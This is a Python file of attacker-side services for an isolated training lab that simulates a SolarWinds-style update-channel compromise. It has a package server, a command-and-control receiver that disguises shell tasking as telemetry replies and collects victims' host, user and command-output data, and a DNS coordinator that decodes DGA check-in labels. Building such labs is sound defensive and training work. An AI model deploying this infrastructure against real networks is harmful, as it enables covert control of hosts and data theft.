"""Small, fixed-purpose services used by the isolated Task 5 lab.

The DNS coordinator and the HTTP receiver belong to the simulated attacker.
Nothing in this file beacons: the implant ships inside the signed V3 package
and runs as its own process in the victim network namespace.
"""

from __future__ import annotations

import http.server
import json
import os
import random
import re
import socket
import socketserver
import struct
import sys
import threading
import time
from pathlib import Path
from urllib.parse import urlsplit
from urllib.request import ProxyHandler, build_opener


import config
import dga


DIRECT_HTTP = build_opener(ProxyHandler({}))
QUERY_LOG_LOCK = threading.Lock()
MAX_QUERY_LOG_BYTES = 96 * 1024


def append_log(path: str, message: str) -> None:
    with open(path, "a", encoding="utf-8") as log:
        log.write(f"{time.strftime('%H:%M:%S')} {message}\n")


def serve_updates(release_dir: str, log_path: str) -> None:
    root = Path(release_dir).resolve()
    artifact_name = re.compile(r"orion-v[123]-[a-f0-9]{16}\.zip(?:\.sig)?\Z")

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self) -> None:  # noqa: N802
            filename = Path(urlsplit(self.path).path.lstrip("/")).name
            if filename != "catalog.json" and not artifact_name.fullmatch(filename):
                self.send_error(404)
                return
            target = root / filename
            if not target.is_file():
                self.send_error(404)
                return
            body = target.read_bytes()
            append_log(log_path, f"GET {filename} -> 200 ({len(body)} bytes)")
            content_type = "application/json"
            if filename.endswith(".zip"):
                content_type = "application/zip"
            elif filename.endswith(".sig"):
                content_type = "application/octet-stream"
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, _format: str, *_args: object) -> None:
            return

    http.server.ThreadingHTTPServer(("0.0.0.0", config.UPDATE_PORT), Handler).serve_forever()


def _read_json(path: Path) -> dict[str, object] | None:
    try:
        value = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return None
    return value if isinstance(value, dict) else None


def _write_json(path: Path, value: object) -> None:
    temporary = path.with_suffix(path.suffix + ".tmp")
    temporary.write_text(json.dumps(value, sort_keys=True, indent=2) + "\n", encoding="utf-8")
    os.replace(temporary, path)


def _read_json_list(path: Path) -> list[object]:
    try:
        value = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return []
    return value if isinstance(value, list) else []


def _valid_text(value: object, maximum: int) -> bool:
    return isinstance(value, str) and 0 < len(value) <= maximum


def _valid_identity(value: object) -> dict[str, str] | None:
    """Map an Improvement Program upload onto the record the lab stores."""
    if not isinstance(value, dict):
        return None
    victim_id = value.get("customerId")
    hostname = value.get("machineName")
    username = value.get("userName")
    os_name = value.get("osVersion")
    ip = value.get("ipAddress")
    version = value.get("clientVersion")
    process = value.get("processName")
    pid = value.get("processId")
    arch = value.get("architecture")
    if (
        not isinstance(victim_id, str)
        or not re.fullmatch(r"v-[a-f0-9]{12}", victim_id)
        or not _valid_text(hostname, 120)
        or not _valid_text(username, 120)
        or not _valid_text(os_name, 200)
        or not _valid_text(ip, 45)
        or version not in {"v1", "v2", "v3"}
        or not _valid_text(process, 120)
        or not _valid_text(pid, 20)
        or not _valid_text(arch, 40)
    ):
        return None
    return {
        "victim_id": victim_id,
        "hostname": hostname,
        "username": username,
        "os": os_name,
        "ip": ip,
        "version": version,
        "process": process,
        "pid": pid,
        "arch": arch,
    }


def _telemetry_reply(task: dict[str, object] | None) -> dict[str, object]:
    """Answer in the shape the updater's Improvement Program endpoint uses."""
    tasks: list[dict[str, object]] = []
    if task is not None:
        tasks.append({"id": task.get("task_id"), "kind": "command", "value": task.get("command")})
    return {
        "version": config.TELEMETRY_VERSION,
        "status": "ok",
        "swip": {"tasks": tasks},
    }


def serve_receiver(
    log_path: str,
    task_path: str,
    beacon_path: str,
    results_path: str,
    result_log_path: str,
) -> None:
    tasks = Path(task_path)
    beacons_file = Path(beacon_path)
    results_file = Path(results_path)
    result_log = Path(result_log_path)
    state_lock = threading.Lock()

    class Handler(http.server.BaseHTTPRequestHandler):
        def send_json(self, status: int, value: dict[str, object]) -> None:
            body = json.dumps(value).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def read_json_body(self, maximum: int = 16 * 1024) -> dict[str, object]:
            length = int(self.headers.get("Content-Length", "-1"))
            if length < 0 or length > maximum:
                raise ValueError("invalid body length")
            value = json.loads(self.rfile.read(length))
            if not isinstance(value, dict):
                raise ValueError("JSON body must be an object")
            return value

        def do_POST(self) -> None:  # noqa: N802
            path = urlsplit(self.path).path
            if path != config.TELEMETRY_PATH:
                self.send_error(404)
                return
            try:
                value = self.read_json_body()
            except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
                self.send_error(400)
                return
            upload = value.get("telemetry")
            if isinstance(upload, list):
                self.handle_telemetry(value, upload)
                return

            identity = _valid_identity(value)
            if identity is None:
                self.send_error(400)
                return
            victim_id = identity["victim_id"]
            now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
            with state_lock:
                beacons = _read_json(beacons_file) or {}
                existing = beacons.get(victim_id, {})
                beacons[victim_id] = {
                    **identity,
                    "first_seen": existing.get("first_seen", now),
                    "last_seen": now,
                }
                _write_json(beacons_file, beacons)
                append_log(log_path, f"POST {path} from {identity['ip']} {identity['hostname']}")
                task = _read_json(tasks)
                deliver: dict[str, object] | None = None
                if task is not None and task.get("target") in {"all", victim_id}:
                    delivered = task.setdefault("delivered_to", [])
                    if isinstance(delivered, list) and victim_id not in delivered:
                        delivered.append(victim_id)
                        _write_json(tasks, task)
                        deliver = task
            self.send_json(200, _telemetry_reply(deliver))
            return

        def handle_telemetry(self, value: dict[str, object], upload: list[object]) -> None:
            entry = next((item for item in upload if isinstance(item, dict)), None)
            victim_id = value.get("customerId")
            task_id = entry.get("id") if entry else None
            command = entry.get("request") if entry else None
            output = entry.get("result", "") if entry else ""
            exit_code = entry.get("exitCode") if entry else None
            error = entry.get("error") if entry else None
            if (
                entry is None
                or not isinstance(task_id, str)
                or not re.fullmatch(r"task-[a-f0-9]{8}", task_id)
                or not isinstance(victim_id, str)
                or not re.fullmatch(r"v-[a-f0-9]{12}", victim_id)
                or not _valid_text(command, 1000)
                or not isinstance(output, str)
                or len(output) > 8192
                or (exit_code is not None and type(exit_code) is not int)
                or (error is not None and not _valid_text(error, 500))
            ):
                self.send_error(400)
                return
            now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
            with state_lock:
                beacons = _read_json(beacons_file) or {}
                hostname = str(beacons.get(victim_id, {}).get("hostname", victim_id))
                results = _read_json_list(results_file)
                results.append({
                    "task_id": task_id,
                    "victim_id": victim_id,
                    "hostname": hostname,
                    "command": command,
                    "exit_code": exit_code,
                    "output": output,
                    "error": error,
                    "received_at": now,
                })
                del results[:-50]
                _write_json(results_file, results)
                append_log(result_log, f'{task_id} {hostname} "{command}" exit={exit_code}')
                current = _read_json(tasks)
                if current is not None and current.get("task_id") == task_id:
                    completed = current.setdefault("completed_by", [])
                    if isinstance(completed, list) and victim_id not in completed:
                        completed.append(victim_id)
                    if current.get("target") != "all" or set(completed) >= set(beacons.keys()):
                        try:
                            tasks.unlink()
                        except FileNotFoundError:
                            pass
                    else:
                        _write_json(tasks, current)
            self.send_json(200, {"accepted": True})

        def log_message(self, _format: str, *_args: object) -> None:
            return

    http.server.ThreadingHTTPServer(("0.0.0.0", config.RECEIVER_PORT), Handler).serve_forever()


def encode_name(name: str) -> bytes:
    parts = name.rstrip(".").split(".")
    return b"".join(bytes((len(part),)) + part.encode("ascii") for part in parts) + b"\0"


def decode_name(packet: bytes, offset: int) -> tuple[str, int]:
    if len(packet) > 4096:
        raise ValueError("oversized DNS packet")
    labels: list[str] = []
    next_offset = offset
    jumped = False
    visited: set[int] = set()
    wire_length = 1  # terminating root label
    while True:
        if offset >= len(packet):
            raise ValueError("truncated DNS name")
        size = packet[offset]
        if size & 0xC0 == 0xC0:
            if offset + 1 >= len(packet):
                raise ValueError("truncated DNS pointer")
            pointer = ((size & 0x3F) << 8) | packet[offset + 1]
            if pointer >= len(packet) or pointer in visited or len(visited) >= 16:
                raise ValueError("invalid DNS compression pointer")
            visited.add(pointer)
            if not jumped:
                next_offset = offset + 2
            offset = pointer
            jumped = True
            continue
        if size & 0xC0:
            raise ValueError("unsupported DNS label encoding")
        offset += 1
        if size == 0:
            if not jumped:
                next_offset = offset
            break
        if size > 63:
            raise ValueError("oversized DNS label")
        end = offset + size
        if end > len(packet):
            raise ValueError("truncated DNS label")
        labels.append(packet[offset:end].decode("ascii"))
        wire_length += size + 1
        if wire_length > 255:
            raise ValueError("oversized DNS name")
        offset = end
    return ".".join(labels).lower(), next_offset


def parse_question(packet: bytes) -> tuple[int, int, str, int, bytes]:
    if len(packet) < 17:
        raise ValueError("short DNS packet")
    transaction_id, flags, question_count = struct.unpack("!HHH", packet[:6])
    if question_count != 1:
        raise ValueError("expected one DNS question")
    name, offset = decode_name(packet, 12)
    qtype, qclass = struct.unpack("!HH", packet[offset : offset + 4])
    if qclass != 1:
        raise ValueError("only Internet DNS questions are supported")
    return transaction_id, flags, name, qtype, packet[12 : offset + 4]


def dns_response(
    transaction_id: int,
    request_flags: int,
    question: bytes,
    answer_type: int | None = None,
    answer_value: str | None = None,
    rcode: int = 0,
) -> bytes:
    flags = 0x8000 | 0x0400 | (request_flags & 0x0100) | rcode
    answer_count = 1 if answer_type is not None and answer_value is not None else 0
    header = struct.pack("!HHHHHH", transaction_id, flags, 1, answer_count, 0, 0)
    if not answer_count:
        return header + question
    if answer_type == 1:
        record_data = socket.inet_aton(answer_value)
    elif answer_type == 5:
        record_data = encode_name(answer_value)
    else:
        raise ValueError("unsupported lab DNS record type")
    record = b"\xc0\x0c" + struct.pack("!HHIH", answer_type, 1, 5, len(record_data)) + record_data
    return header + question + record


def mode_from_file(mode_path: str) -> str:
    try:
        value = json.loads(Path(mode_path).read_text(encoding="utf-8"))
        mode = value.get("mode")
    except (OSError, json.JSONDecodeError):
        mode = "passive"
    return mode if mode in {"passive", "selected", "disabled"} else "passive"


def _append_query(path: Path, entry: dict[str, object]) -> None:
    with QUERY_LOG_LOCK:
        try:
            with path.open("a", encoding="utf-8") as handle:
                handle.write(json.dumps(entry, sort_keys=True) + "\n")
            if path.stat().st_size > MAX_QUERY_LOG_BYTES:
                lines = path.read_text(encoding="utf-8", errors="replace").splitlines()[-200:]
                path.write_text("\n".join(lines) + "\n", encoding="utf-8")
        except OSError:
            return


def serve_dns(mode_path: str, log_path: str) -> None:
    """Answer check-in questions by decoding the label, not by matching a name."""
    queries = Path(log_path).parent / "queries.jsonl"

    class Handler(socketserver.BaseRequestHandler):
        def handle(self) -> None:
            packet, sock = self.request
            try:
                transaction_id, flags, name, qtype, question = parse_question(packet)
            except (ValueError, UnicodeDecodeError, struct.error):
                return
            coordinator = mode_from_file(mode_path)
            kind = "unknown"
            label: str | None = None
            decoded: dict[str, object] | None = None
            error: str | None = None
            answer_type: int | None = None
            answer_value: str | None = None
            rcode = 0
            if qtype != 1:
                rcode = 4
            else:
                label = dga.split_query(name)
                if label is None:
                    if name == config.HANDOFF_NAME and coordinator == "selected":
                        kind = "handoff"
                        answer_type = 5
                        answer_value = config.RECEIVER_NAME
                    elif name == config.RECEIVER_NAME:
                        kind = "receiver"
                        answer_type = 1
                        answer_value = config.RECEIVER_IP
                    else:
                        rcode = 3
                else:
                    kind = "checkin"
                    try:
                        decoded = dga.decode_label(label)
                    except ValueError as exc:
                        error = str(exc)
                        rcode = 3
                    else:
                        if coordinator == "disabled" or decoded["mode"] == dga.MODE_DISABLED:
                            rcode = 3
                        elif coordinator == "selected":
                            answer_type = 1
                            answer_value = config.MODE_IPS["selected"]
                        else:
                            answer_type = 1
                            answer_value = config.MODE_IPS["passive"]
            response = dns_response(transaction_id, flags, question, answer_type, answer_value, rcode)
            sock.sendto(response, self.client_address)
            record = answer_value or f"NXDOMAIN/rcode-{rcode}"
            client = self.client_address[0]
            if kind == "checkin" and decoded is not None:
                detail = (
                    f"qname={name} A coord={coordinator} implant={decoded['mode']}({decoded['mode_name']}) "
                    f"answer={record} host={decoded['hostname']} user={decoded['username']} uid={decoded['uid']}"
                )
            elif kind == "checkin":
                detail = f"qname={name} A coord={coordinator} implant=? answer={record} label-rejected reason={error}"
            else:
                detail = f"qname={name} A coord={coordinator} answer={record} {kind}"
            append_log(log_path, f"{client} {detail}")
            if kind == "checkin":
                entry: dict[str, object] = {
                    "time": time.strftime("%H:%M:%S"),
                    "client": client,
                    "kind": kind,
                    "qname": name,
                    "coordinator_mode": coordinator,
                    "rcode": rcode,
                    "answer": answer_value,
                }
                if decoded is not None:
                    entry.update(decoded)
                    entry["decode_ok"] = True
                else:
                    entry.update({
                        "label": label,
                        "decode_ok": False,
                        "error": error,
                        "looks_encoded": dga.looks_encoded(label or ""),
                    })
                _append_query(queries, entry)

    class Server(socketserver.ThreadingUDPServer):
        allow_reuse_address = True
        daemon_threads = True

    Server((config.DNS_IP, config.DNS_PORT), Handler).serve_forever()


def query_dns(server_ip: str, name: str) -> tuple[int, list[tuple[int, str]]]:
    transaction_id = random.randrange(0, 65536)
    packet = struct.pack("!HHHHHH", transaction_id, 0x0100, 1, 0, 0, 0)
    packet += encode_name(name) + struct.pack("!HH", 1, 1)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:
        client.settimeout(2)
        client.sendto(packet, (server_ip, config.DNS_PORT))
        response, _address = client.recvfrom(2048)
    if len(response) < 12:
        raise ValueError("short DNS response")
    if len(response) > 4096:
        raise ValueError("oversized DNS response")
    response_id, flags, question_count, answer_count, _ns, _ar = struct.unpack("!HHHHHH", response[:12])
    if response_id != transaction_id:
        raise ValueError("DNS transaction ID mismatch")
    if not flags & 0x8000 or question_count != 1:
        raise ValueError("invalid DNS response header")
    if answer_count > 16:
        raise ValueError("too many DNS answers")
    question_name, offset = decode_name(response, 12)
    if question_name != name.lower() or offset + 4 > len(response):
        raise ValueError("DNS question mismatch")
    question_type, question_class = struct.unpack("!HH", response[offset : offset + 4])
    if question_type != 1 or question_class != 1:
        raise ValueError("unexpected DNS question type")
    offset += 4
    records: list[tuple[int, str]] = []
    for _ in range(answer_count):
        _owner, offset = decode_name(response, offset)
        if offset + 10 > len(response):
            raise ValueError("truncated DNS answer")
        rrtype, _class, _ttl, rdlength = struct.unpack("!HHIH", response[offset : offset + 10])
        offset += 10
        rdata_offset = offset
        if offset + rdlength > len(response):
            raise ValueError("truncated DNS answer data")
        rdata = response[offset : offset + rdlength]
        offset += rdlength
        if rrtype == 1 and len(rdata) == 4:
            records.append((rrtype, socket.inet_ntoa(rdata)))
        elif rrtype == 5:
            target, target_end = decode_name(response, rdata_offset)
            if target_end > rdata_offset + rdlength:
                raise ValueError("invalid CNAME answer length")
            records.append((rrtype, target))
    return flags & 0x000F, records


def probe_services(updater_ip: str, dns_ip: str, receiver_ip: str) -> None:
    for address, port in ((updater_ip, config.UPDATE_PORT), (receiver_ip, config.RECEIVER_PORT)):
        with socket.create_connection((address, port), timeout=1):
            pass
    probe_name = dga.build_query("probe", "probe", dga.MODE_PASSIVE)
    rcode, answers = query_dns(dns_ip, probe_name)
    if rcode != 0 or not answers or answers[0] != (1, config.MODE_IPS["passive"]):
        raise RuntimeError("local DNS coordinator is not ready in passive mode")
    print("ready")


def fetch_bytes(url: str, maximum: int = 128 * 1024) -> bytes:
    with DIRECT_HTTP.open(url, timeout=2) as response:
        body = response.read(maximum + 1)
    if len(body) > maximum:
        raise ValueError("update response exceeds the allowed size")
    return body


def fetch(url: str, destination: str) -> None:
    body = fetch_bytes(url)
    Path(destination).write_bytes(body)
    print(json.dumps({"bytes": len(body), "destination": destination}))


def main(argv: list[str]) -> None:
    if len(argv) < 2:
        raise SystemExit("service role required")
    role = argv[1]
    if role == "updates" and len(argv) == 4:
        serve_updates(argv[2], argv[3])
    elif role == "receiver" and len(argv) == 7:
        serve_receiver(argv[2], argv[3], argv[4], argv[5], argv[6])
    elif role == "dns" and len(argv) == 4:
        serve_dns(argv[2], argv[3])
    elif role == "fetch" and len(argv) == 4:
        fetch(argv[2], argv[3])
    elif role == "probe" and len(argv) == 5:
        probe_services(argv[2], argv[3], argv[4])
    else:
        raise SystemExit("invalid service arguments")


if __name__ == "__main__":
    main(sys.argv)
